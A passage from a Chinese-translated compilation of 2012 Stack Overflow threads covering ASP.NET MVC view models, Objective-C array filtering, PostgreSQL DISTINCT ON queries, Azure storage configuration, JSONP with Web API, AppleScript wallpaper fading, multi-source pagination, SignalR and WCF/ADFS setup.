  </div>
 </body>
 </html> 
```

这是它的样子： ![在此处输入图像描述](../Images/07e72137ef20a09703807f52362cbd19.png)

我在 global.asax 中设置了一个字符串来接受审计记录，然后提取主要问题。有一个侧面菜单可以选择问题区域。这是在审核计划是正文的视图中完成的，侧面菜单和表单问题/答案是 Html.Action() 的部分。

全球代码：

```
 routes.MapRoute(
            "AuditSchedule", // Route name

            "AuditSchedule/Audit/{id}/{section}", // URL with parameters
            new { controller = "AuditSchedule", action = "Audit", id = UrlParameter.Optional, section = UrlParameter.Optional } // Parameter defaults

        ); 
```

我试图为此使用视图模型，但我无法让它工作。当谈到 C# 编码中的数据库时，我真的很弱。

这是我正在使用控制器处理的模型：

```
namespace QQAForm.ViewModels
{
public class AuditFormEdit
{
    public Models.MainAnswer ScoreInstance { get; set; }

    public List<ScoreCardCheckBoxHelper> ScoreCardCheckBoxHelperList { get; set; }

    public void InitializeScoreCheckBoxHelperList(List<Models.Score> ScoreList)
    {
        if (this.ScoreCardCheckBoxHelperList == null)
            this.ScoreCardCheckBoxHelperList = new List<ScoreCardCheckBoxHelper>();

        if (ScoreList != null
            && this.ScoreInstance != null)
        {
            this.ScoreCardCheckBoxHelperList.Clear();
            ScoreCardCheckBoxHelper scoreCardCheckBoxHelper;
            string scoreTypes =
                string.IsNullOrEmpty(this.ScoreInstance.Score) ?
                string.Empty : this.ScoreInstance.Score;
            foreach (Models.Score scoreType in ScoreList)
            {
                scoreCardCheckBoxHelper = new ScoreCardCheckBoxHelper(scoreType);
                if (scoreTypes.Contains(scoreType.ScoreName))
                    scoreCardCheckBoxHelper.Checked = true;
                this.ScoreCardCheckBoxHelperList.Add(scoreCardCheckBoxHelper);
            }
        }
    }

    public void PopulateCheckBoxsToScores()
    {
        this.ScoreInstance.Score = string.Empty;
        var scoreType = this.ScoreCardCheckBoxHelperList.Where(x => x.Checked)
                              .Select<ScoreCardCheckBoxHelper, string>(x => x.ScoreName)
                              .AsEnumerable();
        this.ScoreInstance.Score = string.Join(", ", scoreType);
    }

    public class ScoreCardCheckBoxHelper : Models.Score
    {
        public bool Checked { get; set; }

        public ScoreCardCheckBoxHelper() : base() { }

        public ScoreCardCheckBoxHelper(Models.Score scoreCard)
        {
            this.ScoreID = scoreCard.ScoreID;
            this.ScoreName = scoreCard.ScoreName;
        }
    }

}
} 
```

控制器部分：

```
 //get
    public ActionResult _Forms(int id)
    {
        AuditFormEdit viewModel = new AuditFormEdit();
        //viewModel.ScoreInstance = _db.MainAnswers.Single(r => r.AuditScheduleID == id);
        viewModel.InitializeScoreCheckBoxHelperList(_db.Scores.ToList());
        return View(viewModel);
    }

    //post
    [HttpPost]
    public ActionResult _Forms(int id, AuditFormEdit viewModel)
    {
        if (ModelState.IsValid)
        {
            viewModel.PopulateCheckBoxsToScores();
            _db.Entry(viewModel.ScoreInstance).State = System.Data.EntityState.Modified;
            _db.SaveChanges();
            return RedirectToAction("/");
        }
        else
        {
            return View(viewModel);
        }
    } 
```

正如我之前所说，ViewModel 不起作用，因为我要求的 id 不存在。现在，视图模型只有代码来填充答案的复选框。

添加了查看代码 08/14/2012 1:00pm

形成部分视图主要是测试但补充复选框代码的脚本

```
@{ Layout = null; }
@model QQAForm.ViewModels.AuditFormEdit

<table width="698" border="2" cellpadding="2">
<tr>
<td align="center"><b>Section</b><br />1.0</td>
<td><b>Glass edge damage noted. (shells, flakes, sharks teeth)</b>
<br /><br />

@Html.CheckBox("suggestion1") &nbsp;
It was noted that there was a significant amount of glass edge damage observed on the  IG units being produced.  
This glass edge damage may lead to a significantly high glass breakage rate in IG unit handling, in the glazing operation and in service.
[MAJOR CONCERN]
The cause of this glass edge damage should be determined and efforts made to eliminate the damage. 
<br /><br />
@Html.CheckBox("suggestion2") &nbsp;
The glass edge should be smooth and free of chips, flakes, wings, or other damage. Damaged edges may result in stress cracks or premature IG unit failure.
[MAJOR CONCERN]
<br /><br />

<label>Additional Notes:</label><br />
@Html.TextArea("Additional Notes")
<br />
</td>
<td>
        @for (int index = 0; index < Model.ScoreCardCheckBoxHelperList.Count; index++)
        {

            @Html.CheckBoxFor(m => m.ScoreCardCheckBoxHelperList[index].Checked)
            @Html.LabelFor(m => m.ScoreCardCheckBoxHelperList[index], Model.ScoreCardCheckBoxHelperList[index].ScoreName)
            @Html.HiddenFor(m => m.ScoreCardCheckBoxHelperList[index].ScoreID)
            @Html.HiddenFor(m => m.ScoreCardCheckBoxHelperList[index].ScoreName)

        }

 </td>
 </tr>
</table> 
```

这是侧边菜单部分：

```
@{ Layout = null; }

@model IEnumerable<QQAForm.Models.SubCategory>
<div id="menuCol">
<h3>Audit Sections</h3>
        <ul>
            <li>

      @foreach (var item in Model)
        {

                <div class="sidemenu">
                    @Html.ActionLink(item.SubcategoryName, "Audit", new { section = item.SubCategoryID }, null)
                </div>

        }
            </li>
        </ul>   
</div> 
```

这是身体：

```
@model QQAForm.Models.AuditSchedule
@{
ViewBag.Title = "Edit";
Layout = "~/Views/AuditSchedule/_FormLayout.cshtml";
}
<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")"    type="text/javascript"></script>
@using (Html.BeginForm())
{
@Html.ValidationSummary(true)

<fieldset>
<table class="audit-display">
<tr>
<th>ID</th>
<th>Customer</th>
<th>City</th>
<th>State</th>
<th>EPG TSM Rep/NAM</th>
<th>EPG RSM (or NAM's VP)</th>
<th>Tech Rep</th>
<th>Audit Type</th>

</tr>

<tr>
<td>@Html.DisplayFor(m => m.AuditScheduleID)</td>
<td>@Html.DisplayFor(m => m.ar_ship_name)</td>
<td>@Html.DisplayFor(m => m.im_adres_city)</td>
<td>@Html.DisplayFor(m => m.im_adres_state)</td>
<td>@Html.DisplayFor(m => m.epg_sales_rep_accountable)</td>
<td>@Html.DisplayFor(m => m.snp_SalesRep8)</td>
<td>@Html.DisplayFor(m => m.tech_service_rep)</td>
<td>@Html.DisplayFor(m => m.audit_type)</td>

</tr>
 </table>
 <table class="audit-display">
<tr>
<th>Date</th>
<th>Contacts Present</th>
<th>Audit Furnished To</th>
<th>Audit Done By (If not sheduled)</th>
<th>Spacer's Used</th>

</tr>

<tr>
<td>@Html.DisplayFor(m => m.audit_date)</td>
<td>@Html.DisplayFor(m => m.contacts_present)</td>
<td>@Html.DisplayFor(m => m.audit_furnished_to)</td>
<td>@Html.DisplayFor(m => m.audit_done_by)</td>
<td>@Html.DisplayFor(m => m.spacer_type)</td>

</tr>
</table>

</fieldset>
<hr />

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:18:41.273

为什么`int id`要向 _Forms HttpPost 操作添加参数？你不使用它，所以你不需要它，对吧？您也没有演示您的视图代码。

# objective-c - 从 NSMutableArray 的元素中检查 0 作为整数值

> ID：11955551
> 
> 赞同：0
> 
> 时间：2012-08-14T15:20:08.083
> 
> 标签：objective-c, ios, xcode, nsmutablearray, nsarray

我有一个 NSMutable 数组，其中插入了这样的元素：

```
[availableSeatsArray addObject:[NSString stringWithString:num_available]]; 
```

我想删除数组中值为零或更低的元素。我尝试使用它的 int 值甚至它的字符串值来检查元素的值，但它总是通过 '0' 元素大小写。数组前后的控制台输出如下。

```
for (int i=0;i<[availableSeatsArray count]; i++) {
        if ([[availableSeatsArray objectAtIndex:i] intValue] <= 0 || ([[availableSeatsArray objectAtIndex:i] isEqualToString:@"0"])) {
            NSLog(@"Removed index: %d", [[availableSeatsArray objectAtIndex:i] intValue]);
            [availableSeatsArray removeObjectAtIndex:i];
        }
} 
```

控制台输出：

```
Available array: (
    "-2",
    10,
    5,
    "-5",
    0,
    10,
    10,
)
2012-08-14 11:13:28:002 -[dmbAddReservation viewWillAppear:] [Line 1074] Removed index: -2
2012-08-14 11:13:28:004 -[dmbAddReservation viewWillAppear:] [Line 1074] Removed index: -5
2012-08-14 11:13:28:006 -[dmbAddReservation viewWillAppear:] [Line 1083] Available array: (
    10,
    5,
    0, // I cannot explain why this element was not removed
    10,
    10,
) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:36:16.657

几点。

1.  尝试使用`integerValue`而不是`intValue`
2.  与其将数字的字符串表示形式存储在数组中，不如使用 an`NSNumber`代替。这就是它的用途。
3.  在迭代它们时避免改变你的数组。

所以你创建你的数组：

```
[availableSeatsArray addObject:[NSNumber numberWithInteger:[num_available integerValue]]]; 
```

然后您可以将它们过滤掉（注意我使用的是基于块的枚举方法）：

```
__block NSMutableArray *itemsToRemove;
[availableSetsArray enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
    if ([obj integerValue] == 0]) {
        [itemsToRemove addObject:obj]
    }
}];

// Now that you've selected which objects to remove you can actually remove them.
[availableSetsArray removeObjectsInArray:itemsToRemove]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T15:30:09.573

它正在跳过该元素，因为您要删除它之前的 -5 。 `i`递增到下一个值，并且该索引现在被前 10 个占用。可能有几种方法可以解决这个问题，但首先想到的是`filteredArrayUsingPredicate:`（参见[NSArray 文档](http://developer.apple.com/library/ios/#DOCUMENTATION/Cocoa/Reference/Foundation/Classes/NSArray_Class/NSArray.html)）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-14T15:31:09.197

问题是这种方法使用了一个根本有缺陷的逻辑。它错误地不会删除连续出现的 0 或负数对象。原因是，当您在 for 循环中检查“-5”时，它通过了测试，然后您将其删除，缩小数组并移动其剩余元素，以便“0”现在将代替“-5”。但是在 for 循环中，无论元素是否被删除，您都会推进循环变量（在这种情况下为 i），所以现在 'i' 指向零后的一。而且不会被检查。解决方案：只有在没有连续元素通过测试时才增加循环变量（即，将 if 更改为 while）：

```
for (int i = 0; i < [availableSeatsArray count]; i++) {
    while ([[availableSeatsArray objectAtIndex:i] intValue] <= 0
       || ([[reservatiomAvailableArray objectAtIndex:i] isEqualToString:@"0"])) {
        NSLog(@"Removed index: %d", [[availableSeatsArray objectAtIndex:i] intValue]);
        [availableSeatsArray removeObjectAtIndex:i];
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-14T15:41:39.477

我会去`NSPredicate`和`predicateWithBlock:`。对于 NSMutableArray，您可以使用`filterUsingPredicate:`从数组中删除不需要的对象而不创建新对象的方法。以下代码将执行此操作：

```
NSMutableArray *arr = [NSMutableArray arrayWithObjects:@"0",@"1",@"2", @"-50", nil];
NSPredicate *predicate = [NSPredicate predicateWithBlock:^BOOL(NSString* evaluatedObject, NSDictionary *bindings) {
    return [evaluatedObject compare:@"0" options:NSNumericSearch] > 0;
}];
[arr filterUsingPredicate:predicate];
NSLog(@"%@", arr); 
```

# postgresql - 如何只查询每天的最后一条记录

> ID：11955554
> 
> 赞同：6
> 
> 时间：2012-08-14T15:20:09.637
> 
> 标签：postgresql, timestamp

我有一个表功率，其中包含一个名为 sample_time 的 datetimetz 字段和一个名为 amp_hours 的列。

amp_hours 字段大约每两分钟获得一次记录，并在每晚午夜重置。

我想查看每天最后一条记录的 sample_time 和 amp_hours。

我对 SQL 很陌生，所以我可能会忽略一个明显的答案。

我看到了这篇关于如何选择组的最后一条记录的[帖子](https://stackoverflow.com/questions/1313120/retrieving-the-last-record-in-each-group)，但我对 SQL 不够熟悉，无法让它在日期时间工作：

我想使用`lead()`或`lag()`将记录的日期与下一条记录进行比较，但我使用的是 postgresql 8.3，我认为窗口是在 8.4 中引入的。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-14T15:47:46.770

试试这个：

```
SELECT DISTINCT ON (sample_time::date) sample_time, amp_hours
FROM power
ORDER BY sample_time::date DESC, sample_time DESC; 
```

# javascript - 序列化表单数据并发布到通用处理程序

> ID：11955555
> 
> 赞同：1
> 
> 时间：2012-08-14T15:20:10.167
> 
> 标签：javascript, asp.net

如果不使用 jQuery，是否可以序列化我的表单数据并将其发布到我的通用处理程序？

```
<form>
<input id="firstname" type="text">
<input type="hidden" id="serobj"/>
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:24:21.640

你在寻找类似 JSON.stringify() 的东西吗？

[http://www.json.org/js.html](http://www.json.org/js.html)

要提交，您可以使用以下内容：

```
<form name="myform" action="test.php">
   <input id="firstname" type="text">
   <input type="hidden" id="serobj"/>

    <input type="submit" onclick="javascript: submitform()">
</form>
<script type="text/javascript">
function submitform() {
   document.myform.submit();
}
</script> 
```

# c# - Windows Azure 结束连接并返回 324 错误代码

> ID：11955560
> 
> 赞同：8
> 
> 时间：2012-08-14T15:20:23.180
> 
> 标签：c#, azure, azure-storage, azure-storage-emulator

我在 Windows Azure 中尝试了一些实验室，效果很好。因此，我开始使用 Azure Emulator 开发我的应用程序。

我今天在 Windows Azure 中执行了我的第一个部署测试，并遇到了第一个问题：

```
No connection could be made because the target machine actively refused it 127.0.0.1:10000

Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 

Exception Details: System.Net.Sockets.SocketException: No connection could be made because the target machine actively refused it 127.0.0.1:10000

Source Error: 

An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.

Stack Trace: 

[SocketException (0x274d): No connection could be made because the target machine actively refused it 127.0.0.1:10000]
   System.Net.Sockets.Socket.EndConnect(IAsyncResult asyncResult) +2724507
   System.Net.ServicePoint.ConnectSocketInternal(Boolean connectFailure, Socket s4, Socket s6, Socket& socket, IPAddress& address, ConnectSocketState state, IAsyncResult asyncResult, Int32 timeout, Exception& exception) +392

[WebException: Unable to connect to the remote server]
   Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.get_Result() +96
   Microsoft.WindowsAzure.StorageClient.Tasks.Task`1.ExecuteAndWait() +271
   Microsoft.WindowsAzure.StorageClient.CloudBlobContainer.Delete(BlobRequestOptions options) +213
   MyProject.Web.MvcApplication.InitBlobs() in C:\Sites\MyProject\MyProject\MyProject.Web\Global.asax.cs:85
   MyProject.Web.MvcApplication.Application_Start() in C:\Sites\MyProject\MyProject\MyProject.Web\Global.asax.cs:52 
```

这是第一次部署，所以我尝试删除一个不存在的容器。我现在处理异常。

我重新部署了我的项目并且没有收到任何服务器错误。它只是结束了连接并给我留下了这个错误：`Error 324 (net::ERR_EMPTY_RESPONSE)`

我假设我错过了配置中的某些内容，但我无法找到它的确切含义。

谢谢您的帮助！

编辑：部署本身是这个应用程序的第一个，但它不是我在 Windows Azure 上执行的第一个。当我开始为 Windows Azure 进行开发时，我已经部署了一些 msdn 实验室。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-15T16:44:09.617

好的 - 我能够重现这一点，问题在于您的云部署项目的配置。

![我的错误版本](../Images/463fa901529e7253832b5460882e6dd5.png)

我收到此错误的原因是因为我将存储连接字符串设置为指向`"UseDevelopmentStorage=true;"`. 相反，您需要使用 Azure 部署项目中的连接字符串工具来更改`ConfigurationManager`获取其连接字符串的位置，并使用一个用于本地开发和另一个用于部署到云：

*   打开您的 Windows Azure 项目并找到**角色**节点。
*   双击您的 WebRole 项目以打开配置面板
*   单击“**设置”**选项卡以显示为您的项目定义的所有不同设置。你可能会看到这样的东西：

![配置面板](../Images/ed096b85b8226247d87cb748bd7e8946.png)

*   注意`Service Configuration`顶部的组合框。如图所示，我的设置当前表明该`StorageConnectionString`设置将应用于云和本地部署**。**那很糟。
*   看到它下面的那个了吗？第二个？该值显示`<Select Configuration>`在“值”列中，因为该值将取决于您正在运行的配置。

要解决此问题，只需将服务配置更改为`Cloud`然后调整设置：

*   `Service Configuration`将设置更改为**云**
*   单击设置末尾的省略号，`StorageConnectionString`然后选择**Enter storage credentials**。

![配置设置](../Images/b1a0d37a28d02d76332f4d49eee06955.png)

*   保存此对话框和配置设置页面，然后返回创建`CloudStorageAccount`客户端的代码。
*   在您需要获取连接字符串以创建客户端的地方，使用以下代码段：

    // 从连接字符串中检索存储帐户 CloudStorageAccount storageAccount = CloudStorageAccount.Parse( CloudConfigurationManager.GetSetting("StorageConnectionString"));

*   现在`storageAccount`根据您是发布到云还是本地，从正确的连接字符串加载。

当部署向导运行时，它将自动拉入**云**设置，同时保留**本地**设置以在调试器中运行。

试试这个，让我知道它是否不适合你。如果您愿意，我很乐意参加 Lync 会议来浏览您的代码并解决此问题...

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-16T13:34:08.030

好的，我知道我的错误是什么。

出于对抽象的渴望，我设计了一个解决方案，我在我的应用程序中只使用了很少的 blob 连接。有 3 次调用 blob 存储。

*   我的一个`Global.asax`
*   一个在一个`BlobService`
*   一个在一个`ExtensionMethod`

我检查了几次我的 Global.asax 和 BlobService，但忘记了 ExtensionMethod。我在项目开始时编写了它，并且仅在开发中通过以下说明访问我的 blob 帐户：`CloudStorageAccount.DevelopmentStorageAccount`而不是`CloudStorageAccount.Parse(RoleEnvironment.GetConfigurationSettingValue("BlobConnection"))`

Chris Koening 的[回答](https://stackoverflow.com/questions/11955560/windows-azure-ends-connection-and-returns-a-324-error-code/11973439#11973439 "回答")部分正确，因为我在云端时试图访问开发存储。如果您在这个问题中描述了同样的问题，我的建议是：

1.  执行克里斯回答
2.  如果它不能解决您的问题，请尝试通过 Visual Studio 搜索工具或[Agent Ransack](http://www.mythicsoft.com/page.aspx?page=download&type=agentransack%20Agent%20Ransack)`DevelopmentStorageAccount`在您的整个解决方案中查找该字符串，并将其替换为您在第一步中定义的密钥
3.  如果它仍然不能解决您的问题，请尝试查找其他任何地方是否有任何对 DevelopmentStorage 的引用

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T17:41:11.217

您的问题是特定于您机器上安装的组件，而不是特定于 Windows Azure。我可以提供一些提示来解决此类问题，但是很难确定一个特定的根本原因。

你可以做的是直接从模板创建一个非常简单的 Web 角色应用程序，然后在 Windows Azure 模拟器中运行它，看看它是否工作正常。这样您就可以区分您的问题是否特定于您的代码。如果您在一个简单的测试应用程序中遇到完全相同的问题，那么您的问题更多与 Windows Azure 组件有关。

您还可以修改您的应用程序设置以在 IISExpress（默认）或 IIS 服务器上运行，以查看问题行为的变化。如果 IIS 服务器和 IIS Express 都出现完全相同的错误，则可以专注于 Windows Azure 组件来解决问题。

# asp.net-mvc-4 - 使用 MVC4 和新的 Web API 的 JSONP 跨域请求导致 405 或 500 错误

> ID：11955563
> 
> 赞同：1
> 
> 时间：2012-08-14T15:20:29.403
> 
> 标签：asp.net-mvc-4

我已经阅读了一些[文章](https://stackoverflow.com/questions/9421312/jsonp-with-asp-net-web-api)，详细介绍了如何将 JSONP 与 MVC4（我使用的是 RC 版本）和新的 Web Api 一起使用。我正在尝试执行跨域请求。我不知道我做错了什么。我的控制器继承自 MVC4 中的 ApiController 类。我尝试了 Rick Strahl 的实现和其他一些实现。这是我的示例方法：

```
public string StartTracking(string apiKey, DomainTracking domainTracking)
        {
            var user = _userService.GetByApiKey(apiKey);
            if(user != null)
            {
                var domain = user.Domains.FirstOrDefault(d => d.Name.ToLower() == domainTracking.Domain.Name.ToLower());

                if(domain != null)
                {
                    domainTracking.DomainId = domain.Id;
                    domainTracking.Domain = domain;

                    domainTracking.CreatedById = user.Id;
                    domainTracking.ModifiedById = user.Id;

                    var newDomainTracking = _domainTrackingService.Create(domainTracking);
                    return newDomainTracking.Id.ToString();
                }
            }
            else
            {
                throw new HttpResponseException(new HttpResponseMessage(HttpStatusCode.NotFound));
            }
            throw new HttpResponseException(new HttpResponseMessage(HttpStatusCode.NotFound));
        } 
```

这是我的 Jquery 请求代码：

```
function getSessionKey() {

    var Domain = { 'Name': domainName };
    var DomainTracking = { 'Domain': Domain, 'FormElements': getFormElements(), 'ClientLocation': clientLocation };

    $.ajax({
        url: 'http://api.testdomain.com:4646/api/' + apiKey,
        type: 'GET',
        cache: false,
        timeout: 100000,
        data:  DomainTracking,
        dataType: "jsonp",
        error: function (xhr, status, error) {

        },
        success: function (data) {
            sessionKey =  data;
        }

    });
} 
```

如果我将方法名称更改为 GetStartTracking，则会收到 500 错误。如果我保留名称 StartTracking，我会收到 405 not allowed 错误。我需要做什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T16:01:59.913

尝试使用“Get”作为方法的名称。JSONP 可能不适用于帖子，因此您的数据都必须在 url 中，我认为您不能使用 ajax 函数的 data 属性。

这可能会有所帮助

公共类 TrackingController : ApiController {

... public string **Get** (string apiKey, string Domain, string FormElements, string ClientLocation) {

//在这里做所有事情

}

}

并且请求的 URL 应该包含您的控制器的名称和 url 中的所有信息。可能还有其他方法可以做到这一点，但这应该可行。

[http://api.testdomain.com:4646/api/](http://api.testdomain.com:4646/api/)**跟踪**/?apiKey=something&Domain=abc&FormElements=1,2,3&ClientLocaiton=somewhere

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-25T18:25:20.743

您可能缺少 jsonp 的 MediaTypeFormatter。

我已经为此创建了一个示例项目，它使用 Telerik Kendo UI 功能，但无论如何跨域过程都是相同的。您可以在此处下载示例应用程序：[http](http://www.kendoui.com/code-library/mobile/listview.aspx) ://www.kendoui.c​​om/code-library/mobile/listview.aspx 。

此外，您应该在 Api 方法前加上“Get”或将 [HttpGet] 属性添加到方法中。

我希望这有帮助。

# background - 在 Applescript (Mac OS X) 中淡化桌面壁纸

> ID：11955568
> 
> 赞同：0
> 
> 时间：2012-08-14T15:20:47.140
> 
> 标签：background, applescript, desktop, fade, wallpaper

我编写了一个 AppleScript，其中包括设置我的桌面背景。但是，使用 AppleScript 的“设置图片”会突然改变背景 - 它看起来不太好。有没有办法获得通过桌面和屏幕保护程序首选项的“更改图片”设置循环背景时使用的漂亮淡入淡出效果？

理想情况下，我想在 AppleScript 中执行此操作，但如果可以在 Cocoa（或其他）中执行此操作，请告诉我！谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T15:46:43.457

回答我自己的问题！

这不是*我*想要的，但足够接近：

```
set picture rotation to 1 -- turn on wallpaper cycling
set change interval to -1 -- force a change to happen right now
delay 1.5 -- wait a bit to allow for the fade transition - you may want to play w/ this #
set picture of item N of theDesktops to POSIX file ("yourfilenamehere.png") -- set wallpaper to wallpaper you want
set picture rotation to 0  -- turn off wallpaper cycling 
```

通过利用 Apple 的内置壁纸更换器，您可以在 AppleScript 中获得淡入淡出效果，但您需要将要在目录中更改的任何图像放在一起，并在桌面和屏幕保护程序首选项中选择它或以编程方式。

此外，`set picture rotation to 1`似乎会自动将壁纸更改为我认为是该目录中的第一张图片（按字母顺序） - 不过，我没有费心去测试它，但这对我的目的无关紧要。1.5 的延迟允许有点闪烁，但由于我使用的图像是 TARDIS，这是可以接受的，实际上是为了产生很酷的效果（只要我们注意哭泣的天使！）

# json - 如何让 Kindle Fire 浏览器在适当的位置显示 JSON 响应？

> ID：11955571
> 
> 赞同：0
> 
> 时间：2012-08-14T15:20:54.123
> 
> 标签：json, asp.net-web-api, kindle-fire

我有一个 ASP.NET Web API 端点。在我的 Kindle Fire 上的浏览​​器中测试端点时，JSON 响应不会显示在浏览器中。而是下载 .bin 文件。如何让浏览器显示 JSON ？

我可以完全控制 Web API（设计、编写、部署、拥有服务器等），所以我希望能够完成这项工作。

# algorithm - 从多个来源创建分页

> ID：11955574
> 
> 赞同：17
> 
> 时间：2012-08-14T15:20:59.183
> 
> 标签：algorithm, pagination

我需要创建一个带有分页的 HTML 表格。数据来自 2 个不同的来源（可能是来自 2 个不同数据库的 2 个表，比如一个 Oracle，另一个是 MySQL），您不能使用 join select 语句。为了使它更复杂，我需要以升序显示按时间戳（属性之一是时间戳）排序的数据。

例如，源 A 有 45 条记录，源 B 有 55 条记录。所以该表将显示 100 条记录，但一次只显示 15 条记录。所以必须有 7 页（6 页有 15 条记录，1 页有 10 条记录）。

上面的例子总共只有 100 条记录，内存可能很容易将它们全部加载。但在实际生产中，可能是数千或数百万条记录。有谁知道我可以使用的任何算法？我可以提供的参数是页码和每页的记录数。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:49:24.057

据我了解，您关心的是记忆。

如果单个表（A 和 B）没有按时间戳排序，那么您需要将它们的所有记录合并到一个文件中，然后使用一些基于文件的排序算法（类似于 MergeSort，在一次通过中，您会得到排序的记录对，在第二遍你得到排序4s等）。当您有一个所有记录按时间戳升序排列的文件时，您可以将其分成页面。

如果表已经排序，则需要**将**N 个排序序列合并为一个。我建议您组织某种[堆](http://en.wikipedia.org/wiki/Heap_%28data_structure%29 "堆")来跟踪 N 个源中的哪个具有具有最小时间戳的项目。在伪代码中它看起来像这样：

```
for i=1,N
{
  Add the 1st record from each table to the Heap
}
while(Heap not empty)
{
  x = take the smallest item from the heap, noting which table j this record belonged to
  Add x to output
  if (the j-th table is not completely processed)
  {
    take the next value from the j-th table and insert it into the heap
  }
} 
```

复杂度为 O(M*logN)，其中 M 是表中的记录总数，N 是表数。如果 N 足够大（我的猜测是〜100），整个堆的事情才值得麻烦。否则我会使用线性搜索和 O(N*M)。

# c# - SignalR/Silverlight：必须在发送数据之前调用 Start。

> ID：11955579
> 
> 赞同：2
> 
> 时间：2012-08-14T15:21:05.380
> 
> 标签：c#, silverlight, signalr

我有以下客户端代码（Silverlight 4）：

```
HubConnection hubConnection;
IHubProxy alertHub; 

hubConnection = new HubConnection("http://localhost:59805/");
alertHub = hubConnection.CreateProxy("alertservice");

Task startTask = hubConnection.Start().ContinueWith(task =>
{
    if (task.IsFaulted)
    {

    }

    alertHub.Invoke("NewMessage", "asdf", "jkl").Wait();
}); 
```

以及以下服务器代码（托管在 ASP.Net Web 项目中）：

```
[HubName("alertservice")]
public class AlertServiceHub : Hub
{
    public void NewMessage(string userName, string messageText)
    {
        Clients.AddMessage(userName, messageText);
    }
} 
```

在该`alertHub.Invoke`方法上，我收到错误“必须先调用 Start 才能发送数据”。

奇怪的是，当我检查 Fiddler 的连接尝试时，返回以下内容（注意“连接：关闭”）：

```
HTTP/1.1 200 OK
Server: ASP.NET Development Server/10.0.0.0
Date: Tue, 14 Aug 2012 15:11:29 GMT
X-AspNet-Version: 4.0.30319
Transfer-Encoding: chunked
Cache-Control: no-cache
Pragma: no-cache
Expires: -1
Content-Type: text/event-stream
Connection: Close 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T15:49:57.037

我有同样的问题......使用 VS2010、Silverlight4、Nuget 2.1：

像 EkoostikMartin 一样使用 System.Threading.Tasks.SL4 2.1.2，但同样的错误。

在命名空间 Microsoft.AspNet.SignalR.Client.Http；HttpHelper 类：

```
public static Task<HttpWebResponse> GetHttpResponseAsync(this HttpWebRequest request)
        {
            try
            {
                return Task.Factory.FromAsync<HttpWebResponse>(request.BeginGetResponse, ar => (HttpWebResponse)request.EndGetResponse(ar), null);
            }
            catch (Exception ex)
            {
                return TaskAsyncHelper.FromError<HttpWebResponse>(ex);
            }
        } 
```

错误：`(HttpWebResponse)request.EndGetResponse(ar)`

WebException：我可以看到看起来正确的请求 URL：localhost:12345/signalr/...

# android - 是什么导致Android中自定义标题栏周围出现边框？（注意不要求修复）

> ID：11955581
> 
> 赞同：0
> 
> 时间：2012-08-14T15:21:15.837
> 
> 标签：android, titlebar

我在 Android 中制作了一个自定义标题栏，我发现我的标题栏没有填满默认标题栏的整个区域。旧标题栏的默认颜色（蓝色）在边缘“泄漏”，在我的自定义标题栏周围创建了一个蓝色边框，尽管我的标题栏使用...

```
android:layout_height="fill_parent"
android:layout_width="fill_parent" 
```

这方面有很多线程，其中许多似乎涉及更改默认容器的背景颜色或设置其填充，其中一些解决方案似乎不适用于平板电脑，其中一些似乎很hackish。

我的问题**不是**如何解决这个问题（就像我说的，上面有很多线程），所以不要将其标记为重复！但是有人可以解释一下**导致**自定义标题栏周围边框的原因吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:31:32.357

周围的边框来自样式，在 res/values/style 下的样式文件中查找操作栏样式

# wcf - WCF、SSL 和 ADFS2.0 活动联合问题

> ID：11955582
> 
> 赞同：1
> 
> 时间：2012-08-14T15:21:16.767
> 
> 标签：wcf, ssl, .net-4.0, wif, adfs2.0

我在这个配置上度过了一段糟糕的时光。我在没有 SSL 的情况下一切正常，但是将其切换到 SSL 给我带来了一些问题，我正在拉扯我的头发。我的不匹配在哪里？这些配置文件非常复杂，其中发生了很多事情，我不确定从哪里开始。

我看到的错误：

1.  客户端收到异常：System.ServiceModel.Security.SecurityNegotiationException：无法打开安全通道，因为与远程端点的安全协商失败。这可能是由于用于创建通道的 EndpointAddress 中缺少或错误指定了 EndpointIdentity。请验证 EndpointAddress 指定或暗示的 EndpointIdentity 是否正确标识了远程端点。---> System.ServiceModel.FaultException：验证消息的安全性时出错。
2.  所以我打开服务器登录。然后服务器日志显示： System.ServiceModel.Security.MessageSecurityException：**安全处理器无法在消息中找到安全标头。**这可能是因为消息是不安全的错误，或者是因为通信双方之间存在绑定不匹配。如果为安全配置了服务并且客户端未使用安全性，则可能会发生这种情况。

WIF/WCF 客户端 .config：

```
<?xml version="1.0" encoding="utf-8"?>

<configuration>
  <system.serviceModel>
    <client>
      <endpoint address="https://mydevbox.dev1.mydomain.com/AdfsWcfHelloWorld/SayHelloService.svc"
                binding="customBinding"
                bindingConfiguration="WS2007FederationHttpBinding_ISayHelloService"
                contract="ActiveFederationHelpers.Tests.ISayHelloService"
                name="WS2007FederationHttpBinding_ISayHelloService">
        <identity>
          <certificateReference findValue="22909537C6356E15C20C93A5F652FB0C6AA8A282"
                                storeLocation="LocalMachine"
                                storeName="My"
                                x509FindType="FindByThumbprint" />
        </identity>
      </endpoint>
    </client>
    <bindings>
      <customBinding>
        <binding name="WS2007FederationHttpBinding_ISayHelloService">
